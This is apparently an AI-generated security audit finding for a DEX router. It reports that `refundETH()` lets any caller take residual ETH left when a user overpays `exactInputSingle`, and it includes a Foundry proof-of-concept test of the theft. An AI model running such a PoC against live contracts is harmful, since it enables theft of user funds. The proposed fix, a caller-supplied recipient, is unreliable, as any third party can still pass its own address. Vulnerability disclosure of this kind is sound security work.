The key contracts are now fully read. Let me trace the exact attack path through the code.

**`pay()` in `PeripheryPayments.sol` (lines 73-77):** when `token == WETH` and `nativeBalance >= value`, it wraps exactly `value` ETH and leaves the remainder on the router — no sweep of the excess. [1](#0-0) 

**`refundETH()` (lines 58-63):** unconditionally sends the entire ETH balance to `msg.sender` with zero access control — no check that the caller is the original depositor. [2](#0-1) 

**`exactInputSingle()` (lines 67-86):** `payable`, sets payer to `msg.sender`, calls the pool, then clears the callback context — it never sweeps or refunds residual ETH. [3](#0-2) 

The intended safe pattern is `multicall{value}([exactInputSingle, refundETH])`, confirmed by the test at line 106-133, where `delegatecall` preserves `msg.sender` so `refundETH()` returns ETH to the original caller. [4](#0-3) 

However, `exactInputSingle` is a standalone `external payable` function. Nothing in the contract enforces that it must be called through `multicall`. A user who calls it directly with `{value: 2 ether, amountIn: 1 ether}` leaves 1 ether stranded on the router, and any third party can immediately call `refundETH()` to drain it.

---

### Title
`refundETH()` sends entire router ETH balance to arbitrary `msg.sender`, enabling theft of residual ETH from users who overpay `exactInputSingle` outside a `multicall` — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary
`PeripheryPayments.refundETH()` transfers `address(this).balance` to `msg.sender` with no access control. When a user calls `exactInputSingle{value: V}` with `amountIn < V`, the `pay()` helper wraps only `amountIn` worth of ETH and leaves `V - amountIn` on the router. Any caller who subsequently invokes `refundETH()` receives that residual ETH.

### Finding Description
`pay()` handles native-ETH-as-WETH by wrapping exactly the pool-demanded amount and leaving the surplus on the contract:

```solidity
// PeripheryPayments.sol:73-77
if (nativeBalance >= value) {
    IWETH9(WETH).deposit{value: value}();
    IERC20(WETH).safeTransfer(recipient, value);
}
// surplus (nativeBalance - value) silently remains on the router
```

`refundETH()` then sends the full balance to whoever calls it:

```solidity
// PeripheryPayments.sol:58-63
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);   // no msg.sender == depositor check
    }
}
```

`exactInputSingle` is `external payable` and callable directly — the contract imposes no requirement to bundle it with `refundETH()` in a `multicall`.

### Impact Explanation
An attacker observing a victim's `exactInputSingle{value: 2 ether}(amountIn=1 ether)` transaction can call `refundETH()` in the next block (or front-run the victim's own refund call) and receive the full 1 ether residual. The victim's overpaid ETH principal is permanently lost to them. Impact: **direct theft of user ETH principal**, HIGH.

### Likelihood Explanation
- `exactInputSingle` is a primary user-facing entry point; overpaying with native ETH is a natural usage pattern (e.g., slippage buffer, UI rounding).
- `refundETH()` is a zero-argument public function — trivial to call by any EOA or bot.
- No special privileges, no malicious pool, no non-standard tokens required.
- MEV bots routinely monitor for stranded ETH on router contracts.

### Recommendation
Restrict `refundETH()` to return ETH only to a caller-supplied `recipient` that is validated, **or** record the depositor in transient storage at the start of each payable entry point and enforce it inside `refundETH()`. The simplest fix matching the existing multicall pattern is to add a `recipient` parameter:

```solidity
function refundETH(address recipient) external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) _transferETH(recipient, balance);
}
```

and require callers to pass themselves as `recipient`, preventing a third party from redirecting the refund.

### Proof of Concept
```solidity
// Foundry test (pseudo-code)
function test_attacker_steals_residual_eth() public {
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");
    vm.deal(victim, 2 ether);

    // Victim overpays: sends 2 ETH but only 1 ETH is needed for the swap
    vm.prank(victim);
    router.exactInputSingle{value: 2 ether}(
        ExactInputSingleParams({
            tokenIn: address(weth),
            amountIn: 1 ether,   // only 1 ETH wrapped; 1 ETH left on router
            ...
        })
    );

    // 1 ether is now stranded on the router
    assertEq(address(router).balance, 1 ether);

    // Attacker calls refundETH() — no access control
    uint256 before = attacker.balance;
    vm.prank(attacker);
    router.refundETH();

    assertEq(attacker.balance - before, 1 ether);  // attacker stole victim's ETH
    assertEq(address(router).balance, 0);
    // victim can no longer recover their 1 ETH
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-78)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
